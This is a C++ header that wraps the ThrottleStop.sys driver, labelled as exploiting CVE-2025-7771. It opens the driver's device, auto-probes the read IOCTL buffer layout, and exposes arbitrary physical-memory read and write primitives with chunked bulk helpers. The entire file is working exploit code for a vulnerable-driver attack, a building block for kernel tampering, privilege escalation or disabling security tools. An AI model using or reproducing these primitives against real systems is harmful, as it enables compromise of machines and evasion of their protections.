#pragma once
#include <windows.h>
#include <cstdio>

// ==================== ThrottleStop.sys IOCTL definitions ====================
// CVE-2025-7771: MmMapIoSpace abuse via exposed IOCTLs
//
// Buffer layout (METHOD_BUFFERED):
//   [0x00] LARGE_INTEGER  PhysicalAddress   (8 bytes)
//   [0x08] DATA           Value             (1, 2, 4, or 8 bytes)
//
// WRITE IOCTL: InputBufferLength = 8 + data_size, OutputBufferLength = 0
// READ  IOCTL: buffer format auto-detected by Probe()

#define THROTTLESTOP_DEVICE_PATH "\\\\.\\ThrottleStop"
#define IOCTL_READ_PHYSMEM       0x80006498
#define IOCTL_WRITE_PHYSMEM      0x8000649C

// Read IOCTL format variants (the write handler is known from RE;
// the read handler may differ — Probe() tests each one).
enum ReadFormat {
    RF_UNKNOWN = 0,
    RF_SYMMETRIC,     // InLen=OutLen=8+size, data returned at buf[8]  (mirrors the write layout)
    RF_IN8_OUT_FULL,  // InLen=8, OutLen=8+size, data returned at buf[8]
    RF_IN8_OUT_SIZE,  // InLen=8, OutLen=size,   data returned at buf[0]  (PA overwritten)
};

class ThrottleStopDriver {
    HANDLE     m_hDevice = INVALID_HANDLE_VALUE;
    ReadFormat m_readFmt = RF_UNKNOWN;

public:
    ~ThrottleStopDriver() { Close(); }

    bool Open() {
        m_hDevice = CreateFileA(THROTTLESTOP_DEVICE_PATH,
            GENERIC_READ | GENERIC_WRITE, 0, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        return m_hDevice != INVALID_HANDLE_VALUE;
    }

    void Close() {
        if (m_hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(m_hDevice);
            m_hDevice = INVALID_HANDLE_VALUE;
        }
    }

    bool IsOpen() const { return m_hDevice != INVALID_HANDLE_VALUE; }

    // ---------- Auto-detect the read IOCTL buffer layout ----------
    // Reads PA 0x00000 (x86 IVT — always nonzero on real hardware).
    bool Probe() {
        printf("[*] Probing read IOCTL buffer format...\n");
        BYTE buf[16];
        DWORD ret;

        // Format 1: symmetric  (InLen=OutLen=16, data at buf[8])
        memset(buf, 0xCC, 16);
        *(ULONGLONG*)buf = 0ULL;
        ret = 0;
        if (DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM,
                buf, 16, buf, 16, &ret, NULL)) {
            ULONGLONG val = *(ULONGLONG*)(buf + 8);
            printf("    Format SYMMETRIC  : DeviceIoControl OK, ret=%lu, data=0x%016llX\n", ret, val);
            if (val != 0 && val != 0xCCCCCCCCCCCCCCCCULL) {
                m_readFmt = RF_SYMMETRIC;
                printf("[+] Using SYMMETRIC format (InLen=OutLen=8+size, data@8)\n");
                return true;
            }
        } else {
            printf("    Format SYMMETRIC  : FAILED (error %lu)\n", GetLastError());
        }

        // Format 2: InLen=8, OutLen=16, data at buf[8]
        memset(buf, 0xCC, 16);
        *(ULONGLONG*)buf = 0ULL;
        ret = 0;
        if (DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM,
                buf, 8, buf, 16, &ret, NULL)) {
            ULONGLONG val = *(ULONGLONG*)(buf + 8);
            printf("    Format IN8_FULL   : DeviceIoControl OK, ret=%lu, data=0x%016llX\n", ret, val);
            if (val != 0 && val != 0xCCCCCCCCCCCCCCCCULL) {
                m_readFmt = RF_IN8_OUT_FULL;
                printf("[+] Using IN8_OUT_FULL format (InLen=8, OutLen=8+size, data@8)\n");
                return true;
            }
        } else {
            printf("    Format IN8_FULL   : FAILED (error %lu)\n", GetLastError());
        }

        // Format 3: InLen=8, OutLen=8, data at buf[0] (PA overwritten)
        memset(buf, 0xCC, 16);
        *(ULONGLONG*)buf = 0ULL;
        ret = 0;
        if (DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM,
                buf, 8, buf, 8, &ret, NULL)) {
            ULONGLONG val = *(ULONGLONG*)buf;
            printf("    Format IN8_SIZE   : DeviceIoControl OK, ret=%lu, data=0x%016llX\n", ret, val);
            if (val != 0 && val != 0xCCCCCCCCCCCCCCCCULL) {
                m_readFmt = RF_IN8_OUT_SIZE;
                printf("[+] Using IN8_OUT_SIZE format (InLen=8, OutLen=size, data@0)\n");
                return true;
            }
        } else {
            printf("    Format IN8_SIZE   : FAILED (error %lu)\n", GetLastError());
        }

        printf("[-] All read formats failed. IOCTL buffer layout unknown.\n");
        printf("    Verify the driver is loaded and the IOCTL codes are correct.\n");
        printf("    Check with: sc query ThrottleStop\n");
        return false;
    }

    // ---------- Physical memory read primitives ----------

    bool ReadPhys8(ULONGLONG pa, BYTE* out) {
        BYTE buf[16] = {};
        *(ULONGLONG*)buf = pa;
        DWORD ret = 0;
        switch (m_readFmt) {
        case RF_SYMMETRIC:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 9, buf, 9, &ret, NULL)) return false;
            *out = buf[8]; return true;
        case RF_IN8_OUT_FULL:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 8, buf, 9, &ret, NULL)) return false;
            *out = buf[8]; return true;
        case RF_IN8_OUT_SIZE:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 8, buf, 1, &ret, NULL)) return false;
            *out = buf[0]; return true;
        default: return false;
        }
    }

    bool ReadPhys16(ULONGLONG pa, WORD* out) {
        BYTE buf[16] = {};
        *(ULONGLONG*)buf = pa;
        DWORD ret = 0;
        switch (m_readFmt) {
        case RF_SYMMETRIC:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 10, buf, 10, &ret, NULL)) return false;
            *out = *(WORD*)(buf + 8); return true;
        case RF_IN8_OUT_FULL:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 8, buf, 10, &ret, NULL)) return false;
            *out = *(WORD*)(buf + 8); return true;
        case RF_IN8_OUT_SIZE:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 8, buf, 2, &ret, NULL)) return false;
            *out = *(WORD*)buf; return true;
        default: return false;
        }
    }

    bool ReadPhys32(ULONGLONG pa, DWORD* out) {
        BYTE buf[16] = {};
        *(ULONGLONG*)buf = pa;
        DWORD ret = 0;
        switch (m_readFmt) {
        case RF_SYMMETRIC:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 12, buf, 12, &ret, NULL)) return false;
            *out = *(DWORD*)(buf + 8); return true;
        case RF_IN8_OUT_FULL:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 8, buf, 12, &ret, NULL)) return false;
            *out = *(DWORD*)(buf + 8); return true;
        case RF_IN8_OUT_SIZE:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 8, buf, 4, &ret, NULL)) return false;
            *out = *(DWORD*)buf; return true;
        default: return false;
        }
    }

    bool ReadPhys64(ULONGLONG pa, ULONGLONG* out) {
        BYTE buf[16] = {};
        *(ULONGLONG*)buf = pa;
        DWORD ret = 0;
        switch (m_readFmt) {
        case RF_SYMMETRIC:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 16, buf, 16, &ret, NULL)) return false;
            *out = *(ULONGLONG*)(buf + 8); return true;
        case RF_IN8_OUT_FULL:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 8, buf, 16, &ret, NULL)) return false;
            *out = *(ULONGLONG*)(buf + 8); return true;
        case RF_IN8_OUT_SIZE:
            if (!DeviceIoControl(m_hDevice, IOCTL_READ_PHYSMEM, buf, 8, buf, 8, &ret, NULL)) return false;
            *out = *(ULONGLONG*)buf; return true;
        default: return false;
        }
    }

    // ---------- Physical memory write primitives ----------
    // Write layout is confirmed from RE: InLen=8+size, OutLen=0

    bool WritePhys8(ULONGLONG pa, BYTE val) {
        BYTE buf[9] = {};
        *(ULONGLONG*)buf = pa;
        buf[8] = val;
        DWORD ret = 0;
        return DeviceIoControl(m_hDevice, IOCTL_WRITE_PHYSMEM,
            buf, 9, NULL, 0, &ret, NULL) != 0;
    }

    bool WritePhys16(ULONGLONG pa, WORD val) {
        BYTE buf[10] = {};
        *(ULONGLONG*)buf = pa;
        *(WORD*)(buf + 8) = val;
        DWORD ret = 0;
        return DeviceIoControl(m_hDevice, IOCTL_WRITE_PHYSMEM,
            buf, 10, NULL, 0, &ret, NULL) != 0;
    }

    bool WritePhys32(ULONGLONG pa, DWORD val) {
        BYTE buf[12] = {};
        *(ULONGLONG*)buf = pa;
        *(DWORD*)(buf + 8) = val;
        DWORD ret = 0;
        return DeviceIoControl(m_hDevice, IOCTL_WRITE_PHYSMEM,
            buf, 12, NULL, 0, &ret, NULL) != 0;
    }

    bool WritePhys64(ULONGLONG pa, ULONGLONG val) {
        BYTE buf[16] = {};
        *(ULONGLONG*)buf = pa;
        *(ULONGLONG*)(buf + 8) = val;
        DWORD ret = 0;
        return DeviceIoControl(m_hDevice, IOCTL_WRITE_PHYSMEM,
            buf, 16, NULL, 0, &ret, NULL) != 0;
    }

    // ---------- Bulk helpers (chunked into 8/4/2/1-byte ops) ----------

    bool ReadPhysBuffer(ULONGLONG pa, void* buffer, size_t size) {
        BYTE* p = (BYTE*)buffer;
        size_t off = 0;
        while (off < size) {
            size_t rem = size - off;
            ULONGLONG addr = pa + off;
            if (rem >= 8 && (addr & 7) == 0) {
                ULONGLONG v; if (!ReadPhys64(addr, &v)) return false;
                memcpy(p + off, &v, 8); off += 8;
            } else if (rem >= 4 && (addr & 3) == 0) {
                DWORD v; if (!ReadPhys32(addr, &v)) return false;
                memcpy(p + off, &v, 4); off += 4;
            } else if (rem >= 2 && (addr & 1) == 0) {
                WORD v; if (!ReadPhys16(addr, &v)) return false;
                memcpy(p + off, &v, 2); off += 2;
            } else {
                BYTE v; if (!ReadPhys8(addr, &v)) return false;
                p[off] = v; off += 1;
            }
        }
        return true;
    }

    bool WritePhysBuffer(ULONGLONG pa, const void* buffer, size_t size) {
        const BYTE* p = (const BYTE*)buffer;
        size_t off = 0;
        while (off < size) {
            size_t rem = size - off;
            ULONGLONG addr = pa + off;
            if (rem >= 8 && (addr & 7) == 0) {
                ULONGLONG v; memcpy(&v, p + off, 8);
                if (!WritePhys64(addr, v)) return false; off += 8;
            } else if (rem >= 4 && (addr & 3) == 0) {
                DWORD v; memcpy(&v, p + off, 4);
                if (!WritePhys32(addr, v)) return false; off += 4;
            } else if (rem >= 2 && (addr & 1) == 0) {
                WORD v; memcpy(&v, p + off, 2);
                if (!WritePhys16(addr, v)) return false; off += 2;
            } else {
                if (!WritePhys8(addr, p[off])) return false; off += 1;
            }
        }
        return true;
    }
};
